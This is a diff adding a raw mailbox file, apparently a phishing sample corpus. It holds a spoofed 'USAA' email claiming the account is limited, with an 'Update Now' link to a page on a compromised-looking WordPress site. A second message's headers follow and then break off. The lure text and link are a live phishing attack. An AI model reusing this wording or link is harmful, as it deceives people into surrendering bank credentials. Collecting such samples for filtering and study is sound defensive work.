@@ -1,0 +1,81 @@
+From: "USAA" <info@nyu.edu>
+Date: Sat, 18 Jul 2015 13:58:26 -0400
+X-Proofpoint-Virus-Version: vendor=nai engine=5400 definitions=5800 signatures=585085
+X-PP-Spam-Details: rule=add_spam_details policy=default score=96 spamscore=96 ipscore=0
+ suspectscore=26 phishscore=2 bulkscore=0 adultscore=0 classifier=spam
+ adjust=0 reason=mlx scancount=1 engine=7.0.1-1111160001
+ definitions=main-1507180305
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 127
+
+You will not see this in a MIME-aware mail reader.
+--===============0553639818==
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Dear Customer,
+
+Your access to USAA Online Services has been limited.
+To re-gain full access to all of the great benefits, Please
+keep your account updated on our system.
+
+Update Now.
+
+Thank you,
+USAA.
+
+--===============0553639818==
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Dutf-8"/></head>Dear Customer,<br><br>Your access to USAA Online Services=
+ has been limited.<br>To re-gain full access to all of the great benefits, =
+Please<br>keep your account updated on our system.<br><br><a href=3D"http:/=
+/cidrebioduperche.fr//wp-includes/Text/Diff/Renderer/wx.htm">Update Now.</a=
+><br><br>Thank you,<br>USAA.<br></html>
+--===============0553639818==--
+
+From bounces+1447027-71d6-jose=monkey.org@sendgrid.net  Sun Jul 19 06:56:33 2015
+Return-Path: <bounces+1447027-71d6-jose=monkey.org@sendgrid.net>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id B66AFF413E
+	for <jose@login.monkey.org>; Sun, 19 Jul 2015 06:56:33 -0500 (CDT)
+Received: from smtpin12.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay01.b.hostedemail.com (Postfix) with SMTP id 879C734E013
+	for <jose@login.monkey.org>; Sun, 19 Jul 2015 11:56:33 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70424855466.12.dock65_9080e31204345
+Authentication-Results: auth.b.hostedemail.com; dkim=pass
+	reason="1024-bit key; insecure key"
+	header.d=sendgrid.me header.i=@sendgrid.me header.b=MkNq7j/i;
+	dkim-adsp=none (insecure policy); dkim-atps=neutral
+X-Spam-Summary: 1,0,0,,d41d8cd98f00b204,bounces+1447027-71d6-jose=monkey.org@sendgrid.net,:,RULES_HIT,0,RBL:167.89.71.101:@sendgrid.net:.lbl8.mailshell.net-62.18.0.100 64.10.201.10,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fp,MSBL:0,DNSBL:neutral,Custom_rules:0:3:0
+X-HE-Tag: dock65_9080e31204345
+X-Filterd-Recvd-Size: 2212
+Received: from o1678971x101.outbound-mail.sendgrid.net (o1678971x101.outbound-mail.sendgrid.net [167.89.71.101])
+	by imf28.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Sun, 19 Jul 2015 11:56:32 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=sendgrid.me; 
+	h=content-type:mime-version:content-transfer-encoding:from:to:reply-to:subject; 
+	s=smtpapi; bh=uJUhhs7wUDjzspUotOJSyjUEFL4=; b=MkNq7j/i8HiZjWYu5E
+	cKjNINvM7OLquTuDdmxyimdzvAaBIAxRyQ5f98U3DzV0q/LOTVk0Nl3E/u8wwVg0
+	LRyWzxvGR6eLFVq9zga+9aluLqtOce3JevIsVlc6s0zue6TJ4TAZfNGqw1fr4cut
+	fVOUMCzykBWugHmQ6pnv7M0LI=
+Received: by filter-319.sjc1.sendgrid.net with SMTP id filter-319.11022.55AB9061C
+        2015-07-19 11:56:19.859104772 +0000 UTC
+Received: from MTQ0NzAyNw (unknown [10.42.83.122])
+	by ismtpd-074 (SG) with HTTP id 14ea62c05fd.56e2.204e2b
+	for <jared@interestsmart.com>; Sun, 19 Jul 2015 11:56:19 +0000 (UTC)
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
